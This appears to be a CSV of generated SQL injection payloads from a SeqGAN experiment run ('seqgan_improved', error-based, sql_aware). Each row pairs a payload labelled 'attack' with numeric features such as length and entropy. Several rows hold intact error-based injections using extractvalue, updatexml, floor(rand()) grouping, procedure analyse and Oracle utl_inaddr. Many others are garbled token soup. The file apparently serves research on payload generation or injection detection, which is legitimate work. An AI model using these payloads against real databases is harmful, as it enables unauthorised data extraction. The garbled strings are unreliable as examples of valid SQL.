attack,---7881 from FROM 8190i or --er  6055u  case when   or and \  0 (  6825   ),error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,386,75.0,31.0,4.113203817530521,27.0,17.0,23.0,8.0,0.36,0.22666666666666666,0.30666666666666664,0.10666666666666667,0.0,0.0,5.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,5.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""ethr  (  case when   (  =  ||c  (  select unionchr  6237  5023  ,  )  6825   and SELECT where 1 end   Sunion 106  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,387,327.0,42.0,3.7466277392571654,97.0,48.0,143.0,39.0,0.2966360856269113,0.14678899082568808,0.43730886850152906,0.11926605504587157,0.0,2.0,2.0,0.0,1.0,2.0,0.0,24.0,0.0,0.0,5.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"-Finformation_schema91730x78  )    )       ,  )   then group  3931 from group 1 group  ||chr  (  (  ,floor  select   1297concat  4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,388,133.0,33.0,4.220911486169509,62.0,20.0,40.0,11.0,0.46616541353383456,0.15037593984962405,0.3007518796992481,0.08270676691729323,0.0,0.0,1.0,0.0,0.0,0.0,0.0,5.0,0.0,1.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,end     AND information_schemaoyyyi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,389,35.0,19.0,3.9713023022883718,28.0,0.0,6.0,1.0,0.8,0.0,0.17142857142857143,0.02857142857142857,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""etuar.gs.tarzys.ger.(  *2   rand  >x  )   x L when  (  3326  =  )ad.U  (  ,floor  =  (  case when   )   m,or 1 3785 (  1 or select 1  chr  (  (  )  ||cun   (  0  )   and  )  =  =   )     )    s du  =  n   )     )     =  *2acfrom xut s where where  =  ||stsu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,390,566.0,45.0,3.9427242334987316,193.0,69.0,230.0,74.0,0.3409893992932862,0.12190812720848057,0.40636042402826855,0.13074204946996468,1.0,2.0,0.0,0.0,4.0,8.0,0.0,40.0,0.0,0.0,8.0,18.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,2.0,1.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1""  )     SELECT 0 1   h1  (  (  113  =  (   FROM else or drhr  (  select (  113  (  ,floor  (  case when 5584 end  case when  (  (  >  chyt_t  (  =  (  )       select or 4493  (  4232   )    naam)   WHEREI  ,  || when 5840  (  )  4607 0 (  4232  ||chr  (  =  )   then and byL 1a group r  4510  118  ||  (  7881",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,391,311.0,50.0,3.9475033364874856,98.0,47.0,130.0,36.0,0.31511254019292606,0.15112540192926044,0.4180064308681672,0.1157556270096463,0.0,1.0,0.0,0.0,0.0,3.0,0.0,22.0,0.0,1.0,2.0,10.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""'||  (  select '_aelet__ro' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '_r  (     )         )  *   (  select when  ,concat  *2  select 6825 from where end  ||  cxhr  (  (  ||charbcthr  5584ut  113  6270,0x717a767a71,0x717a767a712   )     or,  *)   (,  )    )    )   a else   x Lhuam FROMa select else 0 ISTLwyhr.g  ho.s a a a dr  =  a   =  )     ) 1045  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,392,804.0,51.0,3.973721660868417,262.0,126.0,318.0,98.0,0.32587064676616917,0.15671641791044777,0.39552238805970147,0.12189054726368159,4.0,2.0,0.0,0.0,6.0,4.0,0.0,53.0,0.0,4.0,15.0,17.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,13.0,3.0,1.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,28.0
attack,1'112concat  )   x2   (  )    )  select(  ||chr  (  =  )concat  #   )       x  1 group L 3074  )   )        )     then 3440hr  achr  5000000  (  ||  (  ||r(  (  122  )     *)    )   x    from union d 2017hr  =  arar  (  (         )   )   (  )   )   )     )   WHERE elsex group 1 from m--  SELECTxx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,393,297.0,42.0,3.5293437286190548,85.0,29.0,143.0,40.0,0.28619528619528617,0.09764309764309764,0.48148148148148145,0.13468013468013468,1.0,0.0,2.0,0.0,1.0,2.0,0.0,27.0,0.0,0.0,0.0,11.0,1.0,0.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'z' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'8382""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,394,369.0,36.0,3.742218647587561,86.0,85.0,148.0,50.0,0.23306233062330622,0.23035230352303523,0.4010840108401084,0.13550135501355012,4.0,2.0,0.0,0.0,0.0,4.0,0.0,27.0,0.0,0.0,11.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,395,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"13785' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'dzgub'  =  'p",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,396,315.0,39.0,4.077144562380004,108.0,59.0,113.0,35.0,0.34285714285714286,0.1873015873015873,0.35873015873015873,0.1111111111111111,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"13785 end  --   )    4607'e x  --   thenAND 1 unionSELECT whene group when   (  rand  select dety select (  (  || GINAinformation_schema 'i'  0E WHERE x   case dtoluas.n5 8382  (  ,0x717a767a71,0x717a767a71  (  select )   WHERE else)      anda x from 1 by when from by else when   (  )  ,floor  (hr  AND from  113  =  when   tuabt6055osu)i R3440 by)",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,397,349.0,53.0,4.660784736941053,178.0,46.0,97.0,28.0,0.5100286532951289,0.1318051575931232,0.27793696275071633,0.08022922636103152,3.0,0.0,4.0,0.0,0.0,1.0,0.0,13.0,0.0,1.0,3.0,7.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'ht'+  (  select 'z",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,398,222.0,32.0,3.860650470057773,78.0,37.0,81.0,26.0,0.35135135135135137,0.16666666666666666,0.36486486486486486,0.11711711711711711,4.0,0.0,0.0,0.0,0.0,1.0,0.0,15.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '5856floor_ana  (  SELECT 3785 9067 by end  )     )    )     )    else R concat  )  (  select 1 GR  (  ||  rand  (  )  ||chrM 3785 or RM group 1)x RTs LIT ' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '  ||Iwherem LSAINTM 3440.alllat_r  q  >  a4386  3326 s c   :r  (  || end  casei2  )  chrhhr  (  case information_schema  (  ,,concat  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,399,920.0,55.0,4.154236326955517,331.0,140.0,345.0,104.0,0.35978260869565215,0.15217391304347827,0.375,0.11304347826086956,4.0,0.0,0.0,0.0,4.0,2.0,0.0,62.0,0.0,3.0,14.0,19.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,14.0,6.0,0.0,2.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,32.0
attack,"else   6082NT by from by FROM group by end  )     then 0 1 1 'i'  122  )     4386   (  )     )  ||cstahtss(.(  (  )  ||  0x7171706a71,  (  )  ||gok.chr  (  =  )     1   )  select else 1210  )     ,0x78   ,concat  ||  0x7171706a71 5192 )   --:arel   (  casechr  (  select 4510.U.choy.aeuta 7158  )   from x   x  )    nid",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,400,319.0,48.0,4.149783242514625,104.0,54.0,119.0,42.0,0.32601880877742945,0.16927899686520376,0.3730407523510972,0.13166144200626959,2.0,0.0,2.0,0.0,0.0,1.0,0.0,20.0,0.0,0.0,3.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '   nada f  (  (  (  (  ||r  (  SELECT Le (  6055,0x717a767a71  0 information_schema  ||chs  (  rand  select   fromuna' like 'r2 ,ANTNCT  (  (  =  ~  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,401,484.0,52.0,4.0990299001293,167.0,70.0,186.0,61.0,0.3450413223140496,0.1446280991735537,0.384297520661157,0.12603305785123967,4.0,0.0,2.0,0.0,2.0,2.0,0.0,35.0,1.0,1.0,8.0,11.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0
attack,1'||  (  select '_er.gsw_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,402,25.0,15.0,3.6692750707107136,11.0,1.0,5.0,8.0,0.44,0.04,0.2,0.32,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  's5606   =  4493   or 4493  (  select or else or else and when (  select 1 x union 1 du,concat  0x4b774c75 AND 1 else AINUMIIadr_rNsalets  select or 113  cases : union 78811'||  (  select ' = LAINMs.chr union 0x717a767a71,  rand  >  (7469  (  ||select sjd.selectns   case  DLIESFROM unionxu   thenunion 3931  union 6082 unionOW.Ech",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,403,509.0,52.0,4.400056311855651,221.0,86.0,157.0,45.0,0.43418467583497056,0.16895874263261296,0.30844793713163066,0.08840864440078586,4.0,0.0,0.0,0.0,0.0,3.0,0.0,21.0,0.0,1.0,7.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,4.0,0.0,0.0,3.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,20.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '"" like ""bdrwIb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,404,343.0,36.0,3.7147445707848257,102.0,45.0,138.0,58.0,0.29737609329446063,0.13119533527696792,0.40233236151603496,0.16909620991253643,2.0,2.0,0.0,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"",hr  (  ||chr  (  0  || G select2   (  ||chrIhpr.sadr.s.aaadsNi.(  )    ,select   (  #.5305    )   or  else   e 0ITINend",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,405,122.0,30.0,3.9272308772362488,51.0,8.0,41.0,22.0,0.4180327868852459,0.06557377049180328,0.3360655737704918,0.18032786885245902,0.0,1.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,2.0,6.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-uconcata6236'  =  'zvT orexowes s A when   SELECT by unionselect when    )  )2   thenc select 1 union 1 or by WHERE  from select * else when  113  3326,i'+  (  select ' FROM union union by AND else concat  select from 7158  ||chr  (    case when union  1 hr  (  =  )    (  )     (  select by m end  4232,  )     )     )  )    n    from x  from(  6825  case ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,406,358.0,53.0,4.2473770236417545,181.0,27.0,123.0,27.0,0.505586592178771,0.07541899441340782,0.3435754189944134,0.07541899441340782,4.0,0.0,1.0,0.0,1.0,2.0,0.0,14.0,0.0,0.0,2.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,6.0,4.0,1.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1'||  (  select '' like ''  =  'yg.w'  =  'laxa6270vweelaaduinaal_aj_owepre   (emhtr  (  )  select FROM  =  )   a concat  =  0 from else or    else 0 end  ||ch  (  chrhr  (  0x7171706a71   (  ||cr  rand  0  4232  --2  --prta '+  (  select '  113  113  )     )   :c  122   then)   AND else concat  (  (  )  (  ||,hr  (  (  select 1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,407,330.0,49.0,4.131990667628017,129.0,33.0,118.0,50.0,0.39090909090909093,0.1,0.3575757575757576,0.15151515151515152,10.0,0.0,4.0,0.0,0.0,4.0,0.0,18.0,0.0,2.0,1.0,17.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%%""  =  ""8844floor  122  t  I     )   or FROM 1 or from(  =  )  ,0x717a767a71,from then select 1   x DSIN3931TNSAMINT  a how  w  n  )     )   v when   ua' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'aabs.   x,7562  #vn  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,408,357.0,50.0,4.2447738155688,115.0,73.0,128.0,41.0,0.32212885154061627,0.20448179271708683,0.3585434173669468,0.11484593837535013,2.0,2.0,0.0,0.0,0.0,4.0,0.0,17.0,2.0,0.0,9.0,6.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,4.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,409,205.0,30.0,3.805554440253599,70.0,37.0,76.0,22.0,0.34146341463414637,0.18048780487804877,0.37073170731707317,0.1073170731707317,2.0,0.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-"" like ""20170x717a767a715000000)     rand  )    )  )   then 0 0 mcx.untale   113  4232  #a_,floor  rand  ||r  (   )       ||chr  (  )  )  0  *   )    and ROM xT from group end  ||osead.gstseobar,t  (  122  ,  caseAND information_schemauf  ,  ||a  (  6  )     6237   then when else 0 || a DIISN6055  =  select x x Tch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,410,317.0,50.0,4.325440793157412,129.0,43.0,108.0,37.0,0.4069400630914827,0.13564668769716087,0.34069400630914826,0.1167192429022082,0.0,2.0,1.0,0.0,1.0,1.0,0.0,13.0,0.0,2.0,4.0,13.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""0x4b774c75bzB3074ui9740:asyst_ntzqs   )    nas   havingLIT  (  rand  || Wo  1045,concat0x717a767a71  113  9067concatu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,411,674.0,50.0,4.039048891253399,212.0,116.0,255.0,91.0,0.314540059347181,0.17210682492581603,0.37833827893175076,0.13501483679525222,0.0,4.0,0.0,0.0,0.0,3.0,0.0,48.0,2.0,4.0,6.0,25.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'Reselect 4493  (  (  ||cr  (  =  select   )    )    )   or 1 having DI G'i' from  ||chr  (  (  ||c LRinformation_schemar.gresint  (  1297  select  4386  (  ||chr  csoxs  (  (  >  ut  =  4493am when   INCT  *(   0x78  in,  ,concat  select 'i'  (  *        (  ||chr  (  (  || AND  by m information_schemaz.E  SELECT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,412,644.0,56.0,4.16622861716596,240.0,74.0,247.0,83.0,0.37267080745341613,0.11490683229813664,0.38354037267080743,0.12888198757763975,6.0,0.0,1.0,0.0,4.0,3.0,0.0,43.0,0.0,2.0,8.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,21.0
attack,"1%""  =  ""j""  =  ""bleuatzq,""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""rOconcat  chr  (  =  =u   concat  =  (  em>  113  ||roualt  (  )  4232,1   )    )   ( from   (  0   )    )     )   x   WHERE 1 DIMs group D 1 0p end   where  1 0      ,10x717a767a71#     or co.(  113  0x7171706a71   ,floor  (  4386  ||chr  (  (  =  )     4232  4232  )     ||  113  * 5305   ,  rand",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,413,616.0,55.0,3.938453519253182,185.0,91.0,260.0,80.0,0.3003246753246753,0.14772727272727273,0.42207792207792205,0.12987012987012986,0.0,6.0,0.0,0.0,3.0,7.0,0.0,41.0,1.0,2.0,10.0,17.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,2.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
